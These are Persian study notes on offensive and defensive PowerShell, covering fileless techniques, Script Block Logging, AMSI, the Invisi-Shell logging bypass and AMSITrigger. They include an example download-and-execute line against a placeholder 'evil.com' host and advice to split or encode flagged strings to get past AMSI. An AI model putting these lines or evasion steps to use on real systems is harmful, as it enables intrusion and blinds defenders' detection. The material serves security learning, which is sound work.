
powershell or shell scripting language 

ما با استفاده از زبان اسکریپت نویسی  پاورشل میتونیم اسکریپت هایی برای Automasion کردن کار ها مون در دنیای IT استفاده کنیم 
حالا دلیل اینکه پاورشل در زمینه تست نفوذ به شدت محبوبه به دلیل اینکه پاورشل به object که در سیستم عامل ویندوز وجود دارد دسترسی دارد و میتونه از طریق اون object ها فرایند های مختلفی رو انجام دهد
دومین مورد اینه که پاورشل به کرنل سیستم عامل دسترسی دارد و ما میتونیم از طریق پاورشل بیایم و با زبان ماننده C# با ابجکت های تحت کرنل تعامل برقرار کنیم 
ما از طریق پاورشل میتونیم دستورات WMI اجرا کنیم 
پاورشل چون یک فریمورکی هست که توسط Microsft توضیع شده است ما میتونیم malisious payload خودمون رو از طریق این فریمورک پیش ببریم و به نوعی living of the land یا همون file less malware بنویسیم

پس پاورشل دسترسی به تمام بخش های ویندوز را برای ما فراهم میکند 

**اجرای اسکریپت در حافظه**: قابلیت اجرای اسکریپت‌های قدرتمند رو به طور کامل از حافظه فراهم می‌کنه. این ویژگی باعث میشه برای ایجاد “فوتهولد شل” (یعنی دستیابی اولیه و پایداری در یک سیستم) یا “باکس” (یک ماشین مجازی یا سیستم هدف) خیلی ایده‌آل باشه. این روش کمتر ردی از خودش به جا میذاره و تشخیصش سخت‌تره.

**مبتنی بر .NET و یکپارچه با ویندوز**: بر اساس فریم‌ورک .NET مایکروسافت ساخته شده و به شدت با ویندوز یکپارچه است. این باعث میشه که خیلی خوب با سیستم عامل کار کنه.

**تفاوت با powershell.exe**: نکته مهم اینه که PowerShell خودش `powershell.exe` نیست! بلکه `System.Management.Automation.dll` هستش. این یعنی هسته اصلی PowerShell یک فایل DLL (کتابخانه لینک پویا) هست که قابلیت‌های اون رو فراهم می‌کنه، و `powershell.exe` فقط یک رابط اجرایی برای اون هست.



===============================================================

![[Pasted image 20250901213322.png]]



 ما با استفاده از پاورشل میتونیم بریم اون فایلمون رو از طریق ابجکت 
 net.webClient دانلود کنیم 
 یا از طریق
 # Internet Explorer object from PowerShell


```
$oIE=new-object -com internetexplorer.application  
$oIE.navigate2(“About:blank”)  
while ($oIE.busy) {  
    sleep -milliseconds 50  
}  
$oIE.visible=$true  
$procList=ps |select-object ProcessName,Handles,NPM,PM,WS,VM,CPU,Id |convertto-html

$oDocBody=$oIE.document.documentelement.lastchild ;

#populate the document.body  
$oDocBody.innerhtml=$procList

$oDocBody.style.font=”12pt Arial”;  
$oIE.document.bgcolor=”#D7D7EA”

#Reading back from IE.  
$oTBody=@($oIE.document.getElementsByTagName(“TBODY”))[0] ;  
foreach ($oRow in $oTBody.childNodes)  
{  
   #check the 4 column(WS),and highlight it if it is greater than 5MB.  
   $WS=(@($oRow.childNodes)[4].innerhtml) -as [int]  ;  
   if (($ws -ne $null) -and ($WS -ge 5mb)) {  
       $oRow.bgColor=”#AAAAAA” ;  
   }  
}

#Prepare a title.  
$oTitle=$oIE.document.createElement(“P”)  
$oTitle.style.font=”bold 20pt Arial”  
$oTitle.innerhtml=”Process List”;  
$oTitle.align=”center” ;

#Display the title before the Table object.  
$oTable=@($oIE.document.getElementsByTagName(“TABLE”))[0] ;  
$oDocBody.insertBefore($oTitle,$oTable) > $null;

Displaying the “$procList”  can also be accomplished with “write” methods instead of innerhtml assignment.  But we should perform some extra checks to determine  whether the document.body  is type of [mshtml.htmldocumentclass]. If the “htmlfile” progid has the following settings in the registry:

HKEY_CLASSES_ROOT\CLSID\{25336920-03F9-11CF-8FD0-00AA00686F13}\InProcServer32 

Class        : mshtml.HTMLDocumentClass  
Assembly  : Microsoft.mshtml, Version=7.0.3300.0,  Culture=neutral,       PublicKeyToken=b03f5f7f11d50a3a

then, mshtml.htmldocumentclass become .NET wrapper for the document.body object.  
So the following line :  
$oDocBody.innerhtml=$procList

Can be replaced with:

If ($oIE.document.psbase.tostring() –eq “system.__comobject”) {  
    $oIE.document.write([string]$proclist)  
}  
else {  
    $oIE.document.IHTMLDOcument2_write([string]$proclist)  
}  
$oDocBody=$oIE.document.documentelement.lastchild ;
```



![[Pasted image 20250901214146.png]]

WDAC -----> windows defender application control

### 🔹 Script Block Logging یعنی چی؟

توی ویندوز (به‌خصوص PowerShell)، وقتی یک اسکریپت اجرا میشه، به صورت **Block** (یعنی بخش‌های کدی که PowerShell پردازش می‌کنه) تحلیل و اجرا میشه.

**Script Block Logging** یک قابلیت امنیتی در PowerShell هست که باعث میشه **تمام دستورات و کدهایی که اجرا میشن (حتی اگه Encode یا Obfuscate شده باشن)** لاگ بشن.


### 🔹 چرا مهمه؟

خیلی از حملات سایبری (مثل حملات Red Team یا بدافزارها) از PowerShell استفاده می‌کنن. مهاجم‌ها کدهاشونو **Encode** یا **Obfuscate** می‌کنن (مثلاً Base64 یا تکه‌تکه کردن دستورها) تا شناسایی نشن.


### 🔹 محل ذخیره لاگ‌ها

- توی **Event Viewer**  
    مسیر:

```
Applications and Services Logs
   └── Windows PowerShell
        └── Operational
```

## Event ID اصلی: **4104** (یعنی "Script Block Logging")


### 🔹 مثال

فرض کن مهاجم این دستور رو بزنه:

```
powershell -enc SQBFAFgAIAAiAG4AbwB0AGUAcwBwAGEAZABzACIA
```

(این در واقع دستور ساده‌ای مثل `iex "notespads"` هست که Encode شده)

🚨 بدون Script Block Logging → لاگ فقط همون متن Encode شده رو نشون میده.  
✅ با Script Block Logging → لاگ همون متن Decode شده (`iex "notespads"`) رو نشون میده.


---

## 🔹 ۱. فعال کردن Script Block Logging

### روش اول: Group Policy (برای سازمان‌ها)

1. `gpedit.msc` رو باز کن.
    
2. برو به مسیر:
    
    ```
    Computer Configuration
       └── Administrative Templates
           └── Windows Components
               └── Windows PowerShell
    ```
    
3. گزینه **Turn on PowerShell Script Block Logging** رو پیدا کن و بذار روی **Enabled**.
    
4. می‌تونی گزینه _Log script block invocation start/stop events_ رو هم فعال کنی برای لاگ دقیق‌تر.
    

---

### روش دوم: Registry (برای سیستم‌های تکی یا بدون GPO)

یه کلید رجیستری بساز:

```powershell
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

🔹 با این دستور Script Block Logging فعال میشه.

---

## 🔹 ۲. دیدن لاگ‌ها

بعد از فعال‌سازی، هر دستوری توی PowerShell اجرا بشه لاگ میشه.  
برای دیدنش:

- باز کن: `Event Viewer`
    
- مسیر:
    
    ```
    Applications and Services Logs
       └── Windows PowerShell
            └── Operational
    ```
    
- دنبال **Event ID 4104** بگرد → اینجا متن کامل اسکریپت (حتی Decode شده) رو می‌بینی.
    

---

## 🔹 ۳. تست سریع

یه دستور Encode شده اجرا کن:

```powershell
powershell.exe -enc UwBFAFQALQBDAE8ATgBUAEUATgBUACAAVwBSAEkAVABFAEwASQBOAEUALgBFAHgAZQA=
```

این در واقع دستور ساده‌ای مثل `Set-Content WRITELINE.Exe` هست.  
→ برو توی Event Viewer، بخش Operational، Event ID 4104 رو باز کن.  
✅ می‌بینی که متن Decode شده لاگ شده.

---


## 🔹 AMSI (Antimalware Scan Interface)

- **چی هست؟** یک رابط (API) بین اپلیکیشن‌ها (مثل PowerShell، Office، WScript) و موتورهای آنتی‌ویروس یا EDR.
    
- **کارش:** قبل از اینکه کد اجرا بشه، محتوا رو به آنتی‌ویروس/EDR می‌ده → اون اسکن می‌کنه و می‌تونه بلاکش کنه.
    
- **خروجی:** بلاک یا اجازه‌ی اجرا.
    
- **هدف:** **پیشگیری (Prevention)** از اجرای کد مخرب.
    
- **نقطه ضعف:** مهاجم‌ها بعضی وقتا AMSI رو **bypass** می‌کنن (مثلاً با پچ کردن DLL یا تغییر رشته‌ها).



Bypass Security Powershell

https://github.com/OmeraYa/Invisi-Shell

## Invisi-Shell چیست؟

این یه ابزار **Proof of Concept** (POC) برای مخفی‌سازی اسکریپت‌های PowerShell در ویندوزه که هدفش دور زدن تمام مکانیسم‌های امنیتی PowerShell مثل Script Block Logging، Module Logging، Transcription و یا AMSI هست. این کار با **hook کردن assemblyهای .NET** و استفاده از **CLR Profiler API** انجام میشه.[GitHub](https://github.com/OmerYa/Invisi-Shell?utm_source=chatgpt.com)[kalilinuxtutorials.com](https://kalilinuxtutorials.com/invisi-shell-hide-powershell-script/?utm_source=chatgpt.com)

درواقع Invisi-Shell کاری که می‌کنه اینه که:

- هنگامی که PowerShell قراره کدی رو اجرا کنه، با دسترسی به runtime داخلی و intercept کردن فراخوانی‌ها، می‌تونه جلوی لاگ شدن کد یا تشخیصش توسط AMSI رو بگیره.
    
- این یعنی کدی که obfuscated یا مخفی‌شده هست، مثل اینکه هیچ اتفاق امنیتی نیفتاده، اجرا میشه—بدون اینکه لاگ بشه یا بلاک بشه توسط سامانه‌های امنیتی.


---

### 🔹 مشکل بدون AMSITrigger

وقتی یه اسکریپت PowerShell بنویسی (چه برای تست نفوذ، چه برای Red Team)، ممکنه توسط **AMSI** بلاک بشه.  
ولی خب نمی‌دونی **کدوم قسمت از اسکریپتت باعث بلاک شدن شده**.  
معمولاً باید با روش آزمون و خطا یکی‌یکی خط‌ها رو تغییر بدی → این خیلی وقت‌گیره و اعصاب‌خوره.

---

### 🔹 کاری که AMSITrigger می‌کنه

AMSITrigger کل اسکریپت رو می‌گیره و می‌فرسته سمت **AMSI**، بعد خط‌به‌خط یا بخش‌به‌بخش بررسی می‌کنه.  
هرجا AMSI گفت «این مشکوکه»، دقیقاً همون بخش رو نشونت می‌ده.

✅ یعنی بهت می‌گه: **این رشته / این خط از کدت باعث Trigger شد.**

---

### 🔹 به چه دردی می‌خوره؟

1. **برای Red Team / Pentester**
    
    - می‌فهمی دقیقاً کجای اسکریپتت باعث بلاک شدن میشه.
        
    - همون قسمت رو Obfuscate یا تغییر میدی → بقیه کد دست‌نخورده می‌مونه.
        
    - نتیجه: سریع‌تر AMSI رو Bypass می‌کنی.
        
2. **برای Blue Team / مدافع‌ها**
    
    - می‌بینن AMSI دقیقاً روی چه الگوها یا Signatureهایی حساسه.
        
    - می‌تونن درک بهتری از مکانیزم شناسایی AMSI داشته باشن.
        

---

### 🔹 مثال خیلی ساده

فرض کن یه اسکریپت داری:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://evil.com/mimi.ps1")
```

- AMSITrigger تست می‌کنه و می‌گه: بخش `DownloadString("http://evil.com/mimi.ps1")` باعث Trigger شده.
    
- حالا می‌تونی فقط اون قسمت رو تغییر بدی (مثلاً split یا encode کنی) → و دیگه AMSI گیر نمی‌ده.
    

---

### ⚙️ گزینه‌های اصلی و کاربردی ابزار

- `-i, --inputfile=VALUE`: اسکریپت PowerShell محلی
    
- `-u, --url=VALUE`: بررسی اسکریپت از یک URL
    
- `-f, --format=VALUE`: انتخاب فرمت خروجی (مثلاً فقط نمایش Triggerها، همراه با شماره خط، بصورت inline، یا حالت ویژه "xmas tree")
    
    - 1 = فقط Triggerها
        
    - 2 = همراه با شماره خط
        
    - 3 = inline با کد
        
    - 4 = نمایش تمام فراخوانی‌های AMSI (حالت "xmas tree") [GitHub](https://github.com/RythmStick/AMSITrigger?utm_source=chatgpt.com)[rythmstick.net](https://www.rythmstick.net/posts/amsitrigger/?utm_source=chatgpt.com)
        
- سایر گزینه‌ها: `--debug`, `--chunksize`, `--maxsiglength` برای کنترل دانه‌بندی و دقت بررسی [GitHub](https://github.com/RythmStick/AMSITrigger?utm_source=chatgpt.com)[rythmstick.net](https://www.rythmstick.net/posts/amsitrigger/?utm_source=chatgpt.com)



---

## استفاده‌ کاربردی (مثال)

- اجرا از فایل:
    
    ```bash
    .\AmsiTrigger_x64.exe -i payload.ps1 -f 2
    ```
    
    → نتیجه: نمایش Triggerها همراه با شماره خط.
    
- بررسی از URL:
    
    ```bash
    .\AmsiTrigger_x64.exe -u https://example.com/script.ps1 -f 3
    ```
    
    → نمایش Triggerها بصورت inline با کد مربوطه.
    

با این اطلاعات دقیق، می‌تونی توی اسکریپت اصلاح‌هایی انجام بدی (مثل تغییر رشته، Encode، یا split کردن) تا ترایگر AMSI قطع بشه.

---

![[Pasted image 20250901215949.png]]
